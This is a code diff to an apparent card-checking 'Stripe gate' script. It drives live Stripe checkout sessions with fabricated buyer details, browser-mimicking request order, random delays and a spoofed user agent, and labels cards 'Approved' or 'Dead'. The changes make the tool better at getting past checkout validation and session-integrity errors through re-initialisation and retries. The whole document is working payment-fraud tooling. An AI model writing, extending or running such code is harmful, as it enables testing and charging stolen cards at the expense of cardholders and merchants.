@@ -368,8 +368,9 @@ async def retrieve_merchant_info(cs_live: str, pk_live: str, proxy: str = None) 
 #  STRIPE GATE — Main checkout session hitter
 # ═══════════════════════════════════════════════════════════
 
-async def _session_update(client, cs_live, pk_live, data: dict, headers: dict) -> dict | None:
-    """Fire a single /update call. Returns parsed JSON on success, None on failure."""
+async def _session_update(client, cs_live, pk_live, data: dict, headers: dict) -> tuple:
+    """Fire a single /update call. Returns (json_or_none, error_string_or_none).
+    Silently skips when /update returns 404 (endpoint removed for newer sessions)."""
     try:
         r = await client.post(
             f"https://api.stripe.com/v1/payment_pages/{cs_live}/update",
@@ -377,10 +378,17 @@ async def _session_update(client, cs_live, pk_live, data: dict, headers: dict) -
             headers=headers,
         )
         if r.status_code in (200, 201):
-            return r.json()
-    except Exception:
-        pass
-    return None
+            return r.json(), None
+        if r.status_code == 404:
+            return None, None
+        try:
+            err_json = r.json()
+            err_msg = (err_json.get("error") or {}).get("message", r.text[:120])
+        except Exception:
+            err_msg = r.text[:120]
+        return None, f"HTTP {r.status_code}: {err_msg}"
+    except Exception as e:
+        return None, str(e)[:120]
 
 
 async def stripe_gate(
@@ -494,13 +502,89 @@ async def stripe_gate(
         # Detect required fields
         _needs_email = not (j1.get("customer_email") or "")
         _needs_phone = (j1.get("phone_number_collection") or {}).get("enabled", False)
-        _needs_billing = j1.get("billing_address_collection") == "required"
+        _billing_cfg = j1.get("billing_address_collection") or ""
+        _needs_billing = _billing_cfg in ("required", "auto")
         _needs_shipping = bool((j1.get("shipping_address_collection") or {}).get("allowed_countries"))
         _needs_tos = (j1.get("consent_collection") or {}).get("terms_of_service") == "required"
 
         await asyncio.sleep(random.uniform(0.5, 1.0))
 
-        # ── Step 2: Create PaymentMethod ──
+        # ── Step 2: Submit session details via /update BEFORE PM creation (matches real browser order) ──
+        _upd_errors = []
+
+        # 2a) Email — only submit if session needs it (no pre-set customer_email)
+        if _needs_email:
+            upd_res, upd_err = await _session_update(client, cs_live, pk_live, {"email": email}, _checkout_hdrs)
+            if upd_res:
+                init_checksum = upd_res.get("init_checksum", init_checksum)
+            elif upd_err:
+                _upd_errors.append(f"email: {upd_err}")
+
+        # 2b) Phone number
+        if _needs_phone:
+            await asyncio.sleep(random.uniform(0.2, 0.4))
+            upd_res, upd_err = await _session_update(client, cs_live, pk_live, {"phone_number": phone}, _checkout_hdrs)
+            if upd_res:
+                init_checksum = upd_res.get("init_checksum", init_checksum)
+            elif upd_err:
+                _upd_errors.append(f"phone: {upd_err}")
+
+        # 2c) Billing address — when required OR auto
+        if _needs_billing:
+            await asyncio.sleep(random.uniform(0.2, 0.4))
+            bill = {
+                "billing_address[name]": fullname,
+                "billing_address[line1]": addr["street"],
+                "billing_address[city]": addr["city"],
+                "billing_address[postal_code]": addr["zip"],
+                "billing_address[country]": country,
+            }
+            if addr.get("state"):
+                bill["billing_address[state]"] = addr["state"]
+            upd_res, upd_err = await _session_update(client, cs_live, pk_live, bill, _checkout_hdrs)
+            if upd_res:
+                init_checksum = upd_res.get("init_checksum", init_checksum)
+            elif upd_err:
+                _upd_errors.append(f"billing: {upd_err}")
+
+        # 2d) Shipping address
+        if _needs_shipping:
+            await asyncio.sleep(random.uniform(0.2, 0.4))
+            ship = {
+                "shipping_address[name]": fullname,
+                "shipping_address[address][line1]": addr["street"],
+                "shipping_address[address][city]": addr["city"],
+                "shipping_address[address][postal_code]": addr["zip"],
+                "shipping_address[address][country]": country,
+            }
+            if addr.get("state"):
+                ship["shipping_address[address][state]"] = addr["state"]
+            upd_res, upd_err = await _session_update(client, cs_live, pk_live, ship, _checkout_hdrs)
+            if upd_res:
+                init_checksum = upd_res.get("init_checksum", init_checksum)
+            elif upd_err:
+                _upd_errors.append(f"shipping: {upd_err}")
+
+        # 2e) Safety net: if billing wasn't detected as needed but some /updates failed,
+        #     send billing anyway — Stripe may silently require it
+        if not _needs_billing and _upd_errors:
+            await asyncio.sleep(random.uniform(0.2, 0.4))
+            bill = {
+                "billing_address[name]": fullname,
+                "billing_address[line1]": addr["street"],
+                "billing_address[city]": addr["city"],
+                "billing_address[postal_code]": addr["zip"],
+                "billing_address[country]": country,
+            }
+            if addr.get("state"):
+                bill["billing_address[state]"] = addr["state"]
+            upd_res, _ = await _session_update(client, cs_live, pk_live, bill, _checkout_hdrs)
+            if upd_res:
+                init_checksum = upd_res.get("init_checksum", init_checksum)
+
+        await asyncio.sleep(random.uniform(0.3, 0.6))
+
+        # ── Step 3: Create PaymentMethod ──
         _ua_info = _parse_ua_for_stripe(ua)
         stripe_ua_json = json.dumps({
             "os": {"name": _ua_info["os_name"], "version": _ua_info["os_version"]},
@@ -560,53 +644,6 @@ async def stripe_gate(
 
         await asyncio.sleep(random.uniform(0.3, 0.6))
 
-        # ── Step 3: Submit session details via /update (sequential, one concern per call) ──
-        # 3a) Email — always submit (even if merchant pre-set, Stripe may still need it)
-        upd_res = await _session_update(client, cs_live, pk_live, {"email": email}, _checkout_hdrs)
-        if upd_res:
-            init_checksum = upd_res.get("init_checksum", init_checksum)
-
-        # 3b) Phone number
-        if _needs_phone:
-            await asyncio.sleep(random.uniform(0.2, 0.5))
-            upd_res = await _session_update(client, cs_live, pk_live, {"phone_number": phone}, _checkout_hdrs)
-            if upd_res:
-                init_checksum = upd_res.get("init_checksum", init_checksum)
-
-        # 3c) Billing address — only when explicitly required; omit empty fields
-        if _needs_billing:
-            await asyncio.sleep(random.uniform(0.2, 0.5))
-            bill = {
-                "billing_address[name]": fullname,
-                "billing_address[line1]": addr["street"],
-                "billing_address[city]": addr["city"],
-                "billing_address[postal_code]": addr["zip"],
-                "billing_address[country]": country,
-            }
-            if addr.get("state"):
-                bill["billing_address[state]"] = addr["state"]
-            upd_res = await _session_update(client, cs_live, pk_live, bill, _checkout_hdrs)
-            if upd_res:
-                init_checksum = upd_res.get("init_checksum", init_checksum)
-
-        # 3d) Shipping address
-        if _needs_shipping:
-            await asyncio.sleep(random.uniform(0.2, 0.5))
-            ship = {
-                "shipping_address[name]": fullname,
-                "shipping_address[address][line1]": addr["street"],
-                "shipping_address[address][city]": addr["city"],
-                "shipping_address[address][postal_code]": addr["zip"],
-                "shipping_address[address][country]": country,
-            }
-            if addr.get("state"):
-                ship["shipping_address[address][state]"] = addr["state"]
-            upd_res = await _session_update(client, cs_live, pk_live, ship, _checkout_hdrs)
-            if upd_res:
-                init_checksum = upd_res.get("init_checksum", init_checksum)
-
-        await asyncio.sleep(random.uniform(0.4, 0.8))
-
         # ── Step 4: Confirm payment ──
         confirm_data = {
             "eid": "NA",
@@ -641,11 +678,11 @@ async def stripe_gate(
             err = j3["error"]
             dcode, code, msg = err.get("decline_code", ""), err.get("code", ""), err.get("message", "")
 
-            # Session integrity error — push missing fields via /update, then re-confirm
+            # Session integrity error — re-init session for fresh state, then re-confirm
             if "error has occurred confirming" in msg.lower():
+                # Attempt 1: push fields via /update, re-confirm
                 try:
                     await asyncio.sleep(random.uniform(0.3, 0.6))
-                    # Force-push email + billing + shipping via /update
                     retry_data = {"email": email}
                     retry_data["billing_address[name]"] = fullname
                     retry_data["billing_address[line1]"] = addr["street"]
@@ -664,7 +701,7 @@ async def stripe_gate(
                         retry_data["shipping_address[address][country]"] = country
                         if addr.get("state"):
                             retry_data["shipping_address[address][state]"] = addr["state"]
-                    upd_res = await _session_update(client, cs_live, pk_live, retry_data, _checkout_hdrs)
+                    upd_res, upd_err = await _session_update(client, cs_live, pk_live, retry_data, _checkout_hdrs)
                     if upd_res:
                         init_checksum = upd_res.get("init_checksum", init_checksum)
                         if init_checksum:
@@ -686,7 +723,39 @@ async def stripe_gate(
                 except Exception:
                     pass
 
-                return "Dead! ❌", f"Checkout Session Error [mode={_mode}]", extra(decline_code="session_error", stripe_msg=msg)
+                # Attempt 2: re-init to get fresh checksum, then confirm without stale state
+                try:
+                    await asyncio.sleep(random.uniform(0.3, 0.6))
+                    ri = await client.post(
+                        f"https://api.stripe.com/v1/payment_pages/{cs_live}/init",
+                        data={"key": pk_live, "eid": "NA", "browser_locale": "en-US", "redirect_type": "url"},
+                        headers=_checkout_hdrs,
+                    )
+                    ji = ri.json()
+                    fresh_checksum = ji.get("init_checksum", "")
+                    if fresh_checksum:
+                        confirm_data["init_checksum"] = fresh_checksum
+
+                    await asyncio.sleep(random.uniform(0.3, 0.6))
+                    r3 = await client.post(
+                        f"https://api.stripe.com/v1/payment_pages/{cs_live}/confirm",
+                        data=confirm_data, headers=_checkout_hdrs,
+                    )
+                    j3 = r3.json()
+                    r3_text = r3.text
+                    surl = j3.get("success_url", surl)
+                    if j3.get("status") == "succeeded":
+                        return "Approved! ✅ -» charged!", "Payment Successful", extra(decline_code="charged", stripe_msg="Payment Successful")
+                    err3 = j3.get("error") or {}
+                    if err3.get("decline_code") or err3.get("code"):
+                        return _classify_and_return(err3.get("decline_code", ""), err3.get("code", ""), err3.get("message", ""), extra)
+                    # Surface the actual Stripe error for debugging
+                    err3_msg = err3.get("message", msg)
+                    return "Dead! ❌", f"Confirm Failed: {err3_msg[:100]}", extra(decline_code="session_error", stripe_msg=err3_msg)
+                except Exception:
+                    pass
+
+                return "Dead! ❌", f"Confirm Failed: {msg[:100]}", extra(decline_code="session_error", stripe_msg=msg)
 
             return _classify_and_return(dcode, code, msg, extra)
 
